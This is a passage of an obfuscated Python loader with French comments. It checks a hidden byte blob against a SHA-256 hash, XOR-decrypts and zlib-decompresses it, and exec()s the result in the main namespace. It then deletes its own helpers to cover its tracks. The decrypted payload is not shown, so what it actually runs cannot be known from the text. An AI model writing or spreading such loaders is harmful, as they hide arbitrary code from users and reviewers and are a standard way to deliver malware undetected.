_cy_CEtFZfiwXxt + _cjYcZLqEtmZINb + _cqaqCivHZtwFak + _cj_SLCdYnRgVOF + _ck9KkHKrsx6hRK + _csqzpdZ7WrRWTL + _cl3SC7p2q06oHB + _cqJsZrGTXAWj8W + _cb1p3XT2JEOF5S + _cbnVswbXH3cUfl + _csH96NGRA7N0xV + _croo1FtcTPJz76 + _ccgRicjYTCkUhc + _cbo2rWAjV4oujR + _czHwV7Qba8TzW8 + _cmQffVa6THMUFw + _cePfFhlwA9c92e + _cdY1oQZmX9UxUB + _cdGLPEKHE3igRr + _cgcm3jNrcNHUmY + _cvZVRopuTU2j6G + _csLouEqszrJ9mA + _cwIM2PkGHnJdyG + _cqpyxKLa1V8ST0 + _coQvradEURsux7 + _ck8b6eAiQ3LDMF + _ciWRSfMBUXrWo2 + _cr0L2PA6ExYEGr + _cie04Vb6y19fUn + _ctfrmMtzH5DiKI + _cyDiUnu4153R1p + _cfKzjGnIoFFhb8 + _cs7sAwO08Cuayt + _cvgnlXCGfASEuq + _c_elTYDDzFnbbe + _c_nS_aQBwUULL5 + _ccWNK3fn1DrEft + _cueXSy1NBmv3r2 + _cjUgBEn6c4WVGj + _cr2MdXHFq2WBTJ + _ciN4WNElb57CpO + _cagfIaMB_VHtGG + _cnMWqNcZTzNGWq + _cxkV0xxFmXznPo + _csDsBNFnHUk3yP + _cyDRAlzf8Q0BHx + _cw22oKo75a_QGE + _cwXavjm2YWu0is + _cd6FDW2IPtF5Sr + _cuitkxqaNFTuiJ + _cusPUQCl8bMR_i + _cno04_Svcm7Fdp + _ciDwPfEWMspHKb + _cwSXjoewsMGVLc + _cweFtnvHM4V0tx + _coMVEKNBLzy57l + _cyUg5g0C7z9FsQ + _crhssAEWKNK0Wy + _czePyGvecOtx2O + _ct4UfkwvVvJR58 + _cc2H2QjZR7AdON + _cfPy47r3dxVt0q + _cp2uCAhTEqCBfU)
if __import__('hashlib').sha256(_pnUNnhnWSwLs8Q).hexdigest() != '5093a267c1f5e7ed601ca6aef1c6f572ed54c01269b5dac6b6d496f5ee155374':
    __import__('sys').exit(1)
_xbpGdDYtI0J9Hc = bytes([246, 150, 174, 212, 37, 83, 226, 91, 115, 228, 180, 187, 221])
_fkdPf_0zRZOFrKn = bytes([229, 34, 108, 161, 72, 0, 93, 15, 237, 176, 152, 225, 0])

def _fxnysSEFQ8ZYHAN(_bdrIfTFKw7JyxT, _kgzrF8KSaKV91r):
    return bytes(_bdrIfTFKw7JyxT[_illr71gpdEFCKB] ^ _kgzrF8KSaKV91r[_illr71gpdEFCKB % len(_kgzrF8KSaKV91r)] for _illr71gpdEFCKB in range(len(_bdrIfTFKw7JyxT)))

def _fdg_a00WPQMzVWO(_td7QvDoqyvnjmj):
    import zlib
    return zlib.decompress(_td7QvDoqyvnjmj) # Un seul niveau de zlib ici pour simplifier

def _fem_rqkKvk4Ftxg():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xbhCVKh1uJNmIU = _fxnysSEFQ8ZYHAN(_pnUNnhnWSwLs8Q, _xbpGdDYtI0J9Hc)
    # 2. Décompression Zlib
    _dsD2XUEaK8bnfo = _fdg_a00WPQMzVWO(_xbhCVKh1uJNmIU)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dsD2XUEaK8bnfo.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _njdIQLSVjYa3WG = _main.__dict__
    _njdIQLSVjYa3WG.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _njdIQLSVjYa3WG)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fem_rqkKvk4Ftxg()
try:
    del _fxnysSEFQ8ZYHAN, _fdg_a00WPQMzVWO, _fem_rqkKvk4Ftxg
    del _pnUNnhnWSwLs8Q, _xbpGdDYtI0J9Hc, _fkdPf_0zRZOFrKn
except:
    pass
